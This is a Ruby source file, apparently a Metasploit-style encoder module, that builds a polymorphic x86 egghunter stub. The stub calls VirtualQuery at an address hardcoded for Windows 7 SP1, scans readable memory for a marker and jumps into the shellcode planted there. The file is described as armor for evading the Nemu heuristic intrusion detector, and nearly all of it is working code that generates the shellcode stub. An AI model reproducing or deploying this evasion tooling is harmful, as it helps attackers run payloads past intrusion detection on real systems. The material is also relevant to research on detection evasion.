# -*- coding: binary -*-

# =============================================================
# Egghunting heuristic evasion armoring classes
# NOTE: Since these produce egghunting stubs, they can be called as the very last encoder and with an empty payload (as egghunting assumes preplaced in-memory shellcode)
#       In that case, TODO: supply marker
#
# @Author: Jos Wetzels
# =============================================================

require 'ebnids/ebnids'
require 'ebnids/getpc'
require 'rex/poly'
require 'rex/arch'
require 'rex/text'

module Ebnids


  #
  # Anti-heuristics class for evasion of SYSCALL-based egghunting heuristic
  #
  class Egghunt_API < AntiHeuristicArmor

    def initialize
      super(
        'Name'             => 'API-based egghunting shellcode',  
        'ID'               => 13,             
        'Description'      => 'API-based egghunting shellcode',
        'Author'           => 'Jos Wetzels',   
        'License'          => MSF_LICENSE,   
        'Target'           => 'nemu',             
        'SizeIncrease'     => 0,         
        'isGetPC'          => 1,
        'hasEncoder'       => 0,
        'Conflicts'        => [],             
        'PreDeps'          => [],             
        'PostDeps'         => [])             
    end

    #
    # Lightly-polymorphic getPC stub to hunt for egg using API
    #
    # [-] Limitations:
    #      - Currently only works on Windows 7 Ultimate (64-bit) SP1 (EN)
    #
    # [*] Note:
    #      - This can be further improved by better polymorphism
    #      - This can be further improved by supporting more platforms
    #
    def getPCStub(getPCDestReg)

      badchars = @module_metadata['badchars']

      eggMarker = 0xCAFECAFE

      # Hardcoded VirtualQuery address on Windows 7 Ultimate (64-bit) SP1 (EN)
      virtualQuery = 0x75954422

      # registers cannot be ECX
      gp_regs = Array[Rex::Arch::X86::EAX, Rex::Arch::X86::EDX, Rex::Arch::X86::EBX, Rex::Arch::X86::ESI, Rex::Arch::X86::EDI]
      # ptrReg cannot be EAX, ECX or EDI
      gp_regs2 = Array[Rex::Arch::X86::EDX, Rex::Arch::X86::EBX, Rex::Arch::X86::ESI]
      # randomize
      gp_regs2.shuffle

      ptrReg = gp_regs2[0]

      # other regs cannot be ptrReg
      gp_regs = gp_regs - Array[ptrReg]
      # randomize
      gp_regs.shuffle

      reg1 = gp_regs[0]
      reg2 = gp_regs[1]
      reg3 = gp_regs[2]
      reg4 = gp_regs[3]


      stub = Rex::Arch::X86.xor_reg(ptrReg, ptrReg) +
             "\x66\x81" + (0xC8 + ptrReg).chr + "\xFF\x0F" +    # OR ptrReg (16-bit),0FFF
             (0x40 + ptrReg).chr + # INC ptrReg
             # Make space on stack
             "\x83\xEC\x1C" +    # SUB ESP,1C
             Rex::Arch::X86.mov_reg(reg1, Rex::Arch::X86::ESP) + 
             # VirtualQuery(address, buffer, bufsize)
             "\x6A\x1C" +    # PUSH 1C" +    # ; /BufSize = 1C (28.)
             Rex::Arch::X86.push_reg(reg1) + # PUSH EAX ; | Buffer
             Rex::Arch::X86.push_reg(ptrReg) + # PUSH EAX ; | Address

             Rex::Arch::X86.mov_dword(reg2, virtualQuery) + # reg2 = virtualQuery
             Rex::Arch::X86.call_reg(reg2) + # call virtualQuery

             "\x8B" + (0x44 + (8 * reg3)).chr + "\x24\x14" +    # MOV reg3,DWORD PTR SS:[ESP+14]
             "\x8B" + (0x04 + (8 * reg4)).chr + "\x24" +    # MOV reg4,DWORD PTR SS:[ESP]
             "\x03" + (0x44 + (8 * reg4)).chr + "\x24\x0C" +    # ADD reg4,DWORD PTR SS:[ESP+C]
             "\x83\xC4\x1C" +    # ADD ESP,1C

             Rex::Arch::X86.test_reg(Rex::Arch::X86::EAX, Rex::Arch::X86::EAX) # test eax, eax

      stub = stub + Rex::Arch::X86.je(-(stub.bytesize)) + # je next page
             # check how much space is left between this address and end of region
             Rex::Arch::X86.sub_reg(reg4, ptrReg) + # SUB reg4, ptrReg
             # must be at least 2 DWORDs
             "\x83" + (0xF8 + reg4).chr + "\x08" # CMP reg4, 8

      stub = stub + Rex::Arch::X86.je(-(stub.bytesize)) + # je next page
             Rex::Arch::X86.mov_reg(reg1, reg3) + # mov reg1, reg3
             Rex::Arch::X86.push_reg(ptrReg) + # push ptrReg
             Rex::Arch::X86.set(reg3, 0) + # reg3 = 0
             Rex::Arch::X86.sub(-2, ptrReg, badchars) + # ptrReg = 2
             Rex::Arch::X86.sub(-7, Rex::Arch::X86::ECX, badchars) # ecx = 7

      #pass = ((mbi.Protect & PAGE_READONLY) || (mbi.Protect & PAGE_READWRITE) || (mbi.Protect & PAGE_WRITECOPY) || (mbi.Protect & PAGE_EXECUTE_READ) || (mbi.Protect & PAGE_EXECUTE_READWRITE) || (mbi.Protect & PAGE_EXECUTE_WRITECOPY))
      # check_loop
      stub = stub + "\x80" + (0xF8 + ptrReg).chr + "\x10" +    # CMP ptrReg (8-bit),10 (PAGE_EXECUTE)
             Rex::Arch::X86.je(6) + # je next_iteration (skip because only EXECUTE rights isn't good)
             Rex::Arch::X86.push_reg(reg1) + # push reg1
             "\x21" + (0xC0 + reg1 + (8 * ptrReg)).chr +    # AND reg1, ptrReg (mbi.protect & FLAG)
             "\x09" + (0xC0 + reg3 + (8 * reg1)).chr +      # OR reg3, reg1 (condition |= (mbi.protect & FLAG))
             Rex::Arch::X86.pop_dword(reg1) + # pop reg1
             # next_iteration
             "\xD1" + (0xE0 + ptrReg).chr + # shl ptrReg, 1
             Rex::Arch::X86.loop(-0x0F) # loop check_loop
      # end_check_loop

      stub = stub + Rex::Arch::X86.pop_dword(ptrReg) + # pop ptrReg
             Rex::Arch::X86.test_reg(reg3, reg3) # test reg3, reg3

      stub = stub + Rex::Arch::X86.je(-(stub.bytesize)) + # je next page
             Rex::Arch::X86.mov_dword(Rex::Arch::X86::EAX, eggMarker) + # mov eax, marker
             Rex::Arch::X86.mov_reg(Rex::Arch::X86::EDI, ptrReg) + # mov edi, ptrReg             
             "\xAF"    # SCAS DWORD PTR ES:[EDI]

      stub = stub + Rex::Arch::X86.jnz(-(stub.bytesize - 5)) + # jnz next position in page
             "\xAF"    # SCAS DWORD PTR ES:[EDI]

      stub = stub + Rex::Arch::X86.jnz(-(stub.bytesize - 5)) + # jnz next position in page
             Rex::Arch::X86.jmp_reg(Rex::Arch::X86.reg_name32(Rex::Arch::X86::EDI)) # jmp edi

      return stub
    end

  end


end
